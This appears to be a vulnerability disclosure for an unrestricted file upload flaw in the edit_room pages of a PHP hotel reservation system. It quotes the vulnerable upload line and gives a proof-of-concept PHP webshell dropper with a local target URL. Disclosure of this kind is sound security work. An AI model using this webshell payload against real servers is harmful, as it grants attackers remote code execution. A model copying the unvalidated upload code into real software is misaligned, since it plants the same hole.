# Simple Online Hotel Reservation System #

## supplier ##

https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code

## Vulnerability file ##

edit_query_room.php edit_room.php

## describe ##

The edit_query_room.php and edit_room.php files contain an unrestricted file upload vulnerability, allowing attackers to upload arbitrary files (such as webshells) to the server. Malicious attackers can exploit this vulnerability to gain remote code execution or further compromise the system.

### Code analysis ###

Line 8 in edit_query_room.php

```php
move_uploaded_file($_FILES['photo']['tmp_name'],"../photo/" . $_FILES['photo']['name']);
```
Line 91-110 in edit_room.php
```php
	$(document).ready(function(){
		$pic = $('<img id = "image" width = "100%" height = "100%"/>');
		$lbl = $('<center id = "lbl">[Photo]</center>');
		$("#photo").change(function(){
			$("#lbl").remove();
			var files = !!this.files ? this.files : [];
			if(!files.length || !window.FileReader){
				$("#image").remove();
				$lbl.appendTo("#preview");
			}
			if(/^image/.test(files[0].type)){
				var reader = new FileReader();
				reader.readAsDataURL(files[0]);
				reader.onloadend = function(){
					$pic.appendTo("#preview");
					$("#image").attr("src", this.result);
				}
			}
		});
	});
```

## POC ##
For the file upload vulnerability, you can upload a malicious PHP file (such as a webshell) using the product edit functionality. The application does not validate the file type or content, allowing arbitrary files to be uploaded to the server.

```php
<?php fputs(fopen("shell.php", "w"), '<?php @eval($_POST["shell"]); ?>'); ?>
```

```
http://127.0.0.1:8083/simplehotel/HOR/admin/edit_room.php?room_id=6
```

### Rusult ###
![image](https://github.com/asd1238525/cve/blob/main/1c67a9ce-79e6-406a-986a-32dfaae798c7.png)
For parameter "photo":
![image](https://github.com/asd1238525/cve/commit/87f8460153a7a7e91b3c80b9b2d9622291314e68)
